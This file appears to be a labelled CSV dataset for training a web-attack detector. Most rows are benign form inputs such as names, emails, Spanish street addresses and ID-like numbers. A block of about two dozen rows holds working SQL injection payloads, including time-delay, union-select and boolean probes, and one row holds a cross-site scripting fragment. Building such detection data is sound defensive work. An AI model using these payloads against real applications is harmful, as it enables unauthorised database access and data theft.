payload,attack_type,label
midkiff_mikuni@directoriogratuito.kh,norm,0
58772485x,norm,0
"callerascafria,103,",norm,0
gimialcn,norm,0
39515,norm,0
3582197540300309,norm,0
sprouse,norm,0
zanquita,norm,0
addons,norm,0
14ab214c6n,norm,0
karla,norm,0
jaureguicortines,norm,0
quartet@cabare.com.cs,norm,0
86800649y,norm,0
9091453994786923,norm,0
dyck,norm,0
acre,norm,0
peredabarrio,norm,0
barrymore@hipermadrid.pe,norm,0
52137467d,norm,0
"doctorwaksmann,120,7?b",norm,0
caudete,norm,0
31282,norm,0
3161746053397457,norm,0
chao,norm,0
62si27t8ico,norm,0
4403,norm,0
patacki,norm,0
encrasar,norm,0
xifr,norm,0
pleasande@doloresmusculares.aq,norm,0
86943454g,norm,0
"sanchez49,",norm,0
9008082484622624,norm,0
lubna,norm,0
o+bispar,norm,0
adgardo,norm,0
pealverpalenzuela,norm,0
36914497a,norm,0
"nucleosantiagoapostol34,4?f",norm,0
zabalza,norm,0
20491,norm,0
erickson,norm,0
inord2n6da7e401,norm,0
5445,norm,0
a65esad0,norm,0
efrn,norm,0
conde,norm,0
callecastaos90,norm,0
torre-cardela,norm,0
4867284155125635,norm,0
oran,norm,0
mialgi5,norm,0
tesistecoavi,norm,0
pepet@naturalchild.co,norm,0
pabloiglesiass/n2?f,norm,0
01308,norm,0
technoso,norm,0
remante,norm,0
919,norm,0
briseboi,norm,0
afoscarse,norm,0
net.valdez@salaparis.gt,norm,0
39699852n,norm,0
illano,norm,0
37115,norm,0
2872946473881757,norm,0
spears,norm,0
comisorio,norm,0
triana,norm,0
delngelkercad,norm,0
pesche@campodegolf.com.sy,norm,0
10421521z,norm,0
"etorbideaaskatasuna170,8?a",norm,0
valseca,norm,0
2754013363983769,norm,0
419747iv6,norm,0
1729,norm,0
tse,norm,0
venturamotn,norm,0
sala@mystyleperfume.ls,norm,0
"roure,43,3?d",norm,0
32648,norm,0
7771884953425478,norm,0
meggy,norm,0
3o22ciabl3,norm,0
telema,norm,0
ayatrozas,norm,0
verani@viajesdacapalla.gq,norm,0
25109956m,norm,0
"quinitaflores75,",norm,0
botarell,norm,0
45370,norm,0
3893864101962581,norm,0
etchieso,norm,0
arrego76arse,norm,0
9159,norm,0
marieann,norm,0
1i6p06ej7,norm,0
penarroyaingla,norm,0
54709157t,norm,0
"elhalcon154,8?f",norm,0
03314,norm,0
1571256483586961,norm,0
evin,norm,0
sa6r2,norm,0
sibonet,norm,0
gorcy.davis@carmensanmartin.bo,norm,0
destriana,norm,0
25307,norm,0
longo,norm,0
cojera,norm,0
armerofilippi,norm,0
uzaki@23horas.ie,norm,0
callemadagascar130,norm,0
24391,norm,0
lei-see,norm,0
ineluctable,norm,0
rahue,norm,0
sernakovac,norm,0
pozzetto@miplat.am,norm,0
51795949h,norm,0
"calledelderecho17,",norm,0
50693,norm,0
9473535060757439,norm,0
7a2a6t1ro,norm,0
cooksey,norm,0
pavorde,norm,0
elois,norm,0
gomerogallardo,norm,0
46773841y,norm,0
"paratgeter,33,",norm,0
arndiga,norm,0
8554607392278464,norm,0
vial,norm,0
muntanernevado,norm,0
vasilescu.lisi@drogasvirtuales.sc,norm,0
37905890g,norm,0
"luisbraille,33,12?d",norm,0
40529,norm,0
4608056297024601,norm,0
werling,norm,0
encalador,norm,0
7012,norm,0
barnhill,norm,0
ten.tar,norm,0
quintilio,norm,0
naharro,norm,0
vitola@23horas.ad,norm,0
38980059g,norm,0
"calleisis,180",norm,0
45810,norm,0
6172398321911966,norm,0
janeva,norm,0
desconsolar,norm,0
lzaro,norm,0
infantejuanmanuels/n5?a,norm,0
canfranc,norm,0
26323,norm,0
9738066615220073,norm,0
radioelctrica,norm,0
blondell3,norm,0
mochnquer,norm,0
peller@arvigar.gs,norm,0
30503437d,norm,0
"carrerasturies,49",norm,0
49135,norm,0
8582534834926521,norm,0
aghili,norm,0
escultrico,norm,0
colungacorrius,norm,0
bukoontot@google-movil.cm,norm,0
69634179t,norm,0
c/asuncion1155e,norm,0
almonaciddelasierra,norm,0
6689689469452036,norm,0
rorke,norm,0
3u23pe,norm,0
3318,norm,0
philippa,norm,0
carroar,norm,0
salgadopladellorens,norm,0
schwab.carli@emepleo.info,norm,0
27860,norm,0
brenda,norm,0
8ienne2s6,norm,0
alpar-ornstein@rockefeller.nu,norm,0
15423399j,norm,0
horcajodemontemayor,norm,0
46844,norm,0
gourley,norm,0
sensualmente,norm,0
consalve,norm,0
c406l2n5,norm,0
fabrizio,norm,0
"c/gravina,s/n",norm,0
igzquiza,norm,0
17867,norm,0
6453670410602968,norm,0
zandra,norm,0
agenor,norm,0
iraolarudi,norm,0
chamberlain@muevemiweb.al,norm,0
callejaimeferranz51,norm,0
castellanosdezapardiel,norm,0
12163,norm,0
"1'where6406=6406;selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"1)and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and(4666=4666",sqli,1
-3136%')or3400=6002,sqli,1
-7387')))orderby1--,sqli,1
1'))asgfzbwhere7904=7904;begindbms_lock.sleep(5);end--,sqli,1
"1)))unionallselectnull,null,null#",sqli,1
"-5622""where7970=7970unionallselect7970,7970,7970,7970,7970--",sqli,1
"1""))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and((""smnw""like""smnw",sqli,1
"-9860%""unionallselect6996,6996,6996,6996,6996,6996#",sqli,1
"1));selectdbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5)fromdualand((7240=7240",sqli,1
-2604))assekbwhere6897=6897or1000=7683,sqli,1
"1%"")))waitfordelay'0:0:5'--",sqli,1
"1"")asnrawwhere7984=7984andelt(3114=3114,sleep(5))#",sqli,1
"1%"");selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"1')))or1022=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1%"")));createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and(((""%""=""",sqli,1
"-4259'))asusquwhere5419=5419orelt(8325=8837,8837)--",sqli,1
"1'))and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and(('ijyi'='ijyi",sqli,1
-1638'or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and'xkne'='xkne,sqli,1
"-2583"")where3455=3455ormake_set(9354=9354,7185)--",sqli,1
"-6267"")))or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(((""rqws""=""rqws",sqli,1
"1%"";callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%')))and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
8496429893525706,norm,0
tweddle,norm,0
4932,norm,0
sirevici,norm,0
di0cut6dor7,norm,0
jenermonaj,norm,0
90230020p,norm,0
lospolancos133,norm,0
"pintanos,los",norm,0
6034871098442134,norm,0
berrisfo,norm,0
zaguero,norm,0
vingelli9@custombikesclothes.fr,norm,0
"c/montaerruiz,24,12a",norm,0
fuentelmonge,norm,0
3609841962548925,norm,0
isador,norm,0
m*ule38,norm,0
4906,norm,0
marcanti,norm,0
cimorra,norm,0
jezabel,norm,0
knippenberg@soyriojano.cf,norm,0
05782219l,norm,0
"c/ricardocodoer,112,",norm,0
iza,norm,0
brunhild,norm,0
allaert@chicasdiabolo.ru,norm,0
63974696n,norm,0
"calleplantio,178,",norm,0
fla,norm,0
50629,norm,0
benning,norm,0
demostrar,norm,0
6212,norm,0
refriega,norm,0
isidoro,norm,0
rudie@deuxmanagement.jo,norm,0
06918701w,norm,0
"callelacaldera,7611-c",norm,0
guilas,norm,0
4898771590601702,norm,0
42287106l,norm,0
8043015940180984,norm,0
olsen,norm,0
5urgui8a,norm,0
6087,norm,0
spindler1,norm,0
trincha-32r1,norm,0
stoeckel@hacia.sa,norm,0
08363269d,norm,0
"alqueriadepixarroda,27",norm,0
tossademar,norm,0
0277189059505279,norm,0
dotan,norm,0
rescisorio,norm,0
terribas,norm,0
leftwich@sms24h.sb,norm,0
valdemaluque,norm,0
12232,norm,0
5580428033394873,norm,0
masahiro,norm,0
comba,norm,0
1140,norm,0
humfrey,norm,0
e23i6gulo,norm,0
nicolo,norm,0
brinesgrimalda,norm,0
floor@aebo.af,norm,0
88341714w,norm,0
"callehernancortes,58,",norm,0
29639,norm,0
0052422482512057,norm,0
38i2t702,norm,0
nanni-prucnal@fighting-machines.gf,norm,0
08447437c,norm,0
"c/reinadelcielo136,8-d",norm,0
46510,norm,0
0878247632477262,norm,0
09ca93a4i9lar,norm,0
973,norm,0
merl,norm,0
70p89c9cion958,norm,0
quintn,norm,0
bricat,norm,0
drozdek.waechter@tarifasdevuelos.bj,norm,0
03046730n,norm,0
"rondasantantonimariaclaret144,",norm,0
villacastn,norm,0
jawad,norm,0
92frico,norm,0
hans,norm,0
pipiolosandrini,norm,0
velero@softwaresaas.ec,norm,0
30666350j,norm,0
"c/barriadanuevaandalucia,79,5?f",norm,0
lora,norm,0
12965,norm,0
anja,norm,0
3803,norm,0
vivie4,norm,0
descarada,norm,0
lian,norm,0
colosse@velaconsultores.gob,norm,0
85640413m,norm,0
"c/sanjuanbautista66,1?f",norm,0
fuentedepedronaharro,norm,0
24410,norm,0
1710045357867718,norm,0
inusitado,norm,0
delabarcapitti,norm,0
dierking3@carmensanmartin.kn,norm,0
69557398q,norm,0
9636562879352994,norm,0
beilul,norm,0
trashumacin,norm,0
389,norm,0
hatajo,norm,0
yasna,norm,0
brivio,norm,0
hymen_israeli@aulahost.vc,norm,0
"camillorito,38",norm,0
ansa-sobrarbe,norm,0
5968115219030593,norm,0
bordin,norm,0
rebalg1r,norm,0
jeriacifr,norm,0
litchterman.steiner6@myalbum.by,norm,0
88426780z,norm,0
"callecostadellevant,52",norm,0
murilloelcuende,norm,0
34111,norm,0
ligurs,norm,0
retos9a1o,norm,0
2268,norm,0
braham,norm,0
wieth@camiones-hibridos.md,norm,0
47355557y,norm,0
"camicanrabella,s/n",norm,0
"manzano,el",norm,0
5393761266970595,norm,0
virchick1,norm,0
superable,norm,0
leonila,norm,0
duranmanero,norm,0
paris-loisel@viavilano.cr,norm,0
49511678s,norm,0
"burgos,s/n,1f",norm,0
boimorto,norm,0
08191,norm,0
1959107690181502,norm,0
cycelia,norm,0
rosoli,norm,0
1166,norm,0
swope,norm,0
tr?abal,norm,0
gutman@latiendadecolchones.mn,norm,0
86626999y,norm,0
plazatiloss/n,norm,0
cubillasdesantamarta,norm,0
10182,norm,0
7578225963562090,norm,0
raha,norm,0
de5pi6ar4za4,norm,0
helano,norm,0
sagucnstenla,norm,0
santaniello_tabernero@enfuerteventura.com.ni,norm,0
20847295a,norm,0
plazaasociaciondelaprensa107,norm,0
seguradelosbaos,norm,0
14140,norm,0
reid5,norm,0
chimenea,norm,0
544,norm,0
irado,norm,0
arncantisn,norm,0
norring-fujikawa@autoconstruccion.au,norm,0
"plza.salamanca39,",norm,0
langadelcastillo,norm,0
50780,norm,0
2787973107257855,norm,0
jaswal,norm,0
d060u2ar,norm,0
hania,norm,0
limongidiguez,norm,0
hesseman.dolen@gaudio.mu,norm,0
callevallseca123,norm,0
5176682769033876,norm,0
guillory,norm,0
arme!lluela,norm,0
5155,norm,0
mcculloc,norm,0
menju,norm,0
iris,norm,0
duo_davalos@designworld.cz,norm,0
23251820q,norm,0
isladecuba853-b,norm,0
coripe,norm,0
06927,norm,0
zauhar,norm,0
semanera,norm,0
ezequiel,norm,0
schaafsma@gay-tantra.sj,norm,0
"callealfazdelpi,9611?d",norm,0
villanuevadelrebollar,norm,0
38450,norm,0
8198356178876064,norm,0
grimsley,norm,0
luego,norm,0
3880,norm,0
trampeador,norm,0
kovac,norm,0
97230292t,norm,0
"calledecancastellvi35,10-h",norm,0
vindel,norm,0
28194,norm,0
humfrid,norm,0
expendedora,norm,0
leonelo,norm,0
carvajal,norm,0
lightner.manor@rosaserigrafia.as,norm,0
83217349z,norm,0
castellnovo,norm,0
19127,norm,0
3413347210986966,norm,0
ania,norm,0
esmilcea,norm,0
3040,norm,0
huerfanidad,norm,0
robertino,norm,0
hindman@primeracasa-ebs.il,norm,0
91220241x,norm,0
"josegomezgallito,107,",norm,0
alarba,norm,0
32252,norm,0
0577312599845778,norm,0
cowart,norm,0
inoportunamente,norm,0
garrudocastellon,norm,0
carminati@granbretana.com.uk,norm,0
33273113w,norm,0
"callepea49,9?b",norm,0
munbrega,norm,0
4611888318080805,norm,0
adapuesto,norm,0
alvean,norm,0
9o52cardea7,norm,0
benito@mayoriasilenciosa.mu,norm,0
16574331w,norm,0
callejuandesevilla1023c,norm,0
cabanabona,norm,0
33001,norm,0
4az,norm,0
"callerendona45,5-a",norm,0
8914644367191799,norm,0
fady,norm,0
a8o8decer,norm,0
2049,norm,0
sonoe,norm,0
hirn,norm,0
portaltauler,norm,0
"c/mirra25,",norm,0
santquirzedebesora,norm,0
27784,norm,0
8648898617825850,norm,0
meier,norm,0
c6nte9osa,norm,0
nimia,norm,0
buisnandres,norm,0
oliveira_aptekman@engibraltar.va,norm,0
"inocenciaalayon,s/n4-f",norm,0
sanbartolomdelatorre,norm,0
12510,norm,0
3227728964471059,norm,0
nadav6,norm,0
3244,norm,0
keer,norm,0
amarili,norm,0
55265136t,norm,0
"c/generalmerrydelval,s/n",norm,0
45674,norm,0
2996877022240469,norm,0
wa77en,norm,0
"torrentdecancaralleu48,12-g",norm,0
telde,norm,0
50513,norm,0
7745667684469889,norm,0
brain,norm,0
c7ada98o,norm,0
7242,norm,0
kalpak,norm,0
tolera9lemen8e,norm,0
sixto,norm,0
peredohuecas,norm,0
byron@vinavilano.gl,norm,0
21468433a,norm,0
"toril,1715h",norm,0
45790,norm,0
5036144025003599,norm,0
edlene,norm,0
descote,norm,0
albiol,norm,0
blankenship@likeanangel.tc,norm,0
14554532v,norm,0
"callejoseespejo,130,12?a",norm,0
42148,norm,0
muth,norm,0
tom159,norm,0
3046,norm,0
neufeld,norm,0
ru5runears2,norm,0
leobaldo,norm,0
benson-rabasa@mareventsprotocolosocial.ad,norm,0
53087910t,norm,0
"zafiro,s/n4?b",norm,0
urdialesdelpramo,norm,0
50174,norm,0
wei-tsig8,norm,0
otisineiro,norm,0
sabu@aridossanchez.lt,norm,0
"avingudapinyana,72-h",norm,0
avellanosademu,norm,0
06196,norm,0
4780723426433072,norm,0
teddie,norm,0
abellot*ada,norm,0
new,norm,0
583opi4,norm,0
donaldo,norm,0
castellsargatal,norm,0
radir@diagnosticoradiologico.mil,norm,0
58222899d,norm,0
"caminohoyamondongo,124",norm,0
galende,norm,0
3892784649587009,norm,0
vacher,norm,0
coxcojita,norm,0
quiliano,norm,0
77232447b,norm,0
pombal1143?d,norm,0
puertodebjar,norm,0
5399041434530750,norm,0
ramesh,norm,0
cane5o,norm,0
8516,norm,0
haroun,norm,0
lluv8os4,norm,0
einar,norm,0
vanobranchadell,norm,0
02650843r,norm,0
"c/lahoz,17",norm,0
piadecampos,norm,0
3556606130011191,norm,0
sandie,norm,0
en8relan3amien0o,norm,0
pavlow@permutatucasa.fm,norm,0
60537126e,norm,0
9438831900620350,norm,0
mariana,norm,0
emblanquimiento,norm,0
1789,norm,0
sari7,norm,0
4m4or6711a662,norm,0
corico,norm,0
95549133a,norm,0
"sayago,156,",norm,0
baosdemolgas,norm,0
28760,norm,0
hocutt,norm,0
monte9a,norm,0
sibila,norm,0
neugebauer@buscamoto.gw,norm,0
37246742j,norm,0
"galeno106,9?c",norm,0
ciadoncha,norm,0
17744,norm,0
8444341614355746,norm,0
tiefenth,norm,0
i77ovar,norm,0
8436,norm,0
rini,norm,0
inobediecia,norm,0
donaciano,norm,0
matienzogallifa,norm,0
69082096d,norm,0
c/guillensantacilla94,norm,0
40151,norm,0
harmonie,norm,0
6r5int3805,norm,0
ikediektorrades,norm,0
tarp@redstarz.asia,norm,0
donjuan126,norm,0
"oso,el",norm,0
17403,norm,0
3786004753545909,norm,0
3andador4,norm,0
1112,norm,0
brion6,norm,0
demos3rativa,norm,0
gavald,norm,0
selk@inversioneolica.ee,norm,0
45854746z,norm,0
"c/calcorreu,0,",norm,0
cbdar,norm,0
08030,norm,0
cal,norm,0
acrianzada,norm,0
mairozio,norm,0
victorjuan,norm,0
ballasko@quehaces.mr,norm,0
"callesierradelquintanar,1999-b",norm,0
gaianes,norm,0
2930629510541352,norm,0
ex074ico,norm,0
1230,norm,0
iorgo,norm,0
c0l0o4a,norm,0
bentezmonill,norm,0
mouchet@007tv.fj,norm,0
50159319e,norm,0
"antoniotoledano,78,10?h",norm,0
roelosdesayago,norm,0
49167,norm,0
uriah,norm,0
cabildeo,norm,0
maestrecamprubi,norm,0
eckstine@blueeyes.eu,norm,0
46942381w,norm,0
"guadalajara,1014-e",norm,0
venialbo,norm,0
17861,norm,0
6913071576619939,norm,0
beland,norm,0
gravoso,norm,0
7192,norm,0
ryszard,norm,0
e1bud8,norm,0
alarico,norm,0
nrezmuriscot,norm,0
gude1@messadivoce.ai,norm,0
"logroo,98,5-d",norm,0
santllorensavall,norm,0
9589985001483437,norm,0
harty,norm,0
torns,norm,0
llobet,norm,0
confirm(2)>/,xss,1
brace4@velazquezlarraaga.kz,norm,0
19783837l,norm,0
"alcaldelopezrancao,194,3-e",norm,0
vilafams,norm,0
09270,norm,0
1499600534131254,norm,0
mundy,norm,0
alatn,norm,0
5642,norm,0
chan+quete,norm,0
jernima,norm,0
69653229y,norm,0
"cruzdecaravaca,177",norm,0
daimiel,norm,0
14970,norm,0
4159457629727955,norm,0
valcourt,norm,0
encuar,norm,0
brauganfornina,norm,0
angele6@juegossonic.com.eh,norm,0
64721683m,norm,0
c/franciscograndecobian904-e,norm,0
uju,norm,0
41570,norm,0
5068023807822442,norm,0
loudiadi,norm,0
in85ecuacin,norm,0
1304,norm,0
athony,norm,0
irresolucin,norm,0
nemesio,norm,0
bedmar,norm,0
veronese@prestigecars.tv,norm,0
99020664y,norm,0
"calledoctorjosemanuelpascualypascual146,4?c",norm,0
torrecilladelmonte,norm,0
29620,norm,0
0936495801431480,norm,0
or5i6or6i686,norm,0
llullvalls,norm,0
ordezanka@arroyo-molinos.dj,norm,0
costur,norm,0
49495,norm,0
witney,norm,0
malandrn,norm,0
546,norm,0
fantaseadora,norm,0
aitor,norm,0
alcaldegregorioespino165,norm,0
pozanco,norm,0
18212,norm,0
3596949565075836,norm,0
dud,norm,0
henriquezfemenias,norm,0
seymour@evelin.gn,norm,0
"c/fraydiegodecadiz,50",norm,0
mombuey,norm,0
3302117123489448,norm,0
kiyohara,norm,0
47761an0i59r,norm,0
576,norm,0
downs,norm,0
tapinga,norm,0
jemima,norm,0
sunyerlleix,norm,0
abadia@comercioenlacalle.er,norm,0
87348482w,norm,0
"c/carranque,1135?a",norm,0
45240,norm,0
8490972534756597,norm,0
kobeski,norm,0
prueba,norm,0
vivencio,norm,0
goyenaga,norm,0
lenya@fbi-criminal-network.com.mil,norm,0
hermanosbarral61,norm,0
cantaracillo,norm,0
40190,norm,0
5076820691273276,norm,0
9253,norm,0
trung,norm,0
fragmentar,norm,0
quiyen,norm,0
ricci@redhost.is,norm,0
89821319v,norm,0
pl.herreradelosnavarros6812-h,norm,0
palaciosdelarzobispo,norm,0
8322438262219801,norm,0
chung,norm,0
reele.cto,norm,0
roussel@santacruzdelvoto.ws,norm,0
96269598q,norm,0
sariego,norm,0
7626699319590675,norm,0
domeable,norm,0
2864,norm,0
babar4,norm,0
miller_fiore9@olvidalo.sy,norm,0
17652259n,norm,0
callesegismundomoret931?a,norm,0
50297,norm,0
0614375180233873,norm,0
racette,norm,0
borgeaud@enmenorca.com.om,norm,0
52984297w,norm,0
"jabeque,86,",norm,0
relleu,norm,0
tetreaul7,norm,0
espavorida,norm,0
9564,norm,0
23l8noi7e,norm,0
bezclua,norm,0
gretler-rinell@magadan.com.yu,norm,0
38888523p,norm,0
lugargrela1521?f,norm,0
19185,norm,0
bui,norm,0
soportador,norm,0
trillesaedo,norm,0
79365532f,norm,0
callesietecerros144,norm,0
hornillosdelcamino,norm,0
pankiw,norm,0
f8rol5ra,norm,0
8671,norm,0
9a7bl1,norm,0
paucides,norm,0
yetillamus,norm,0
selj@ebaz.travel,norm,0
plza.maimonides197,norm,0
bsconesdeojeda,norm,0
15873,norm,0
1204533777404121,norm,0
faucette,norm,0
grandlocua,norm,0
talaverapanfili,norm,0
thyssen.ferrell@somosagelespaa.bg,norm,0
tierra17,norm,0
santjoandevilatorrada,norm,0
34305,norm,0
9307824408281680,norm,0
pipponzi,norm,0
5469,norm,0
clarabel,norm,0
enconadura,norm,0
redmond-delcampe@biosaludsystems.do,norm,0
callecorinto108,norm,0
47606,norm,0
ordinar,norm,0
vogin,norm,0
"c/bascuana52,5-e",norm,0
puebladeobando,norm,0
parman,norm,0
c4ap0765do,norm,0
108,norm,0
ja3aln,norm,0
neri,norm,0
crispvivo,norm,0
chopel@restauranteslaespadaa.bg,norm,0
"sanjorge,188",norm,0
ysero,norm,0
10380,norm,0
9771406974624162,norm,0
lukers,norm,0
ofere*nte,norm,0
gastn,norm,0
faix,norm,0
bartowna@professionalhost.do,norm,0
69441548v,norm,0
"callegoladeperellonet,196,",norm,0
albuixech,norm,0
5220241028812840,norm,0
ch9let_a,norm,0
1084,norm,0
denni,norm,0
e3c7i3tu3a,norm,0
torremorosoenrich,norm,0
amsterdam@mailboxrussia.nz,norm,0
33371147x,norm,0
"c/torre,151,9?b",norm,0
50004,norm,0
6187378791844475,norm,0
dowser,norm,0
comiso,norm,0
thordsen@guejos.sy,norm,0
02877417w,norm,0
callevillalon131g,norm,0
46842,norm,0
0911357592887177,norm,0
oucharek,norm,0
?malgastador,norm,0
6721,norm,0
marcum3,norm,0
26t9g71,norm,0
leda,norm,0
pifarremarola,norm,0
foody@cup-id.sd,norm,0
57401003h,norm,0
"juanxxii24,3?c",norm,0
aldehueladeyeltes,norm,0
46838,norm,0
7496121103658289,norm,0
babs,norm,0
9mbaicin,norm,0
cladera,norm,0
seddon@7peines.es,norm,0
"callelostipografos,98,4g",norm,0
tors,norm,0
6239536280691962,norm,0
funderbu,norm,0
a9tr8pfag4,norm,0
patenaud,norm,0
9a470ul0,norm,0
gaudencio,norm,0
25559456q,norm,0
"callejoaquingamon175,2-c",norm,0
villamurieldecerrato,norm,0
4s2cu8e44,norm,0
"parquesanadrian,196,5h",norm,0
tredway,norm,0
torrija,norm,0
4337,norm,0
scherzin,norm,0
perih1lio,norm,0
gervasio,norm,0
princepmuntadas,norm,0
young-kyun@forohh.cl,norm,0
"josemuozsanroman,s/n,",norm,0
9475732136741046,norm,0
xavier,norm,0
tarasca,norm,0
10262643c,norm,0
c/javea57,norm,0
22470,norm,0
1055239425022881,norm,0
chinchintor,norm,0
8232,norm,0
co01,norm,0
gierasch.casini@goovitae.cu,norm,0
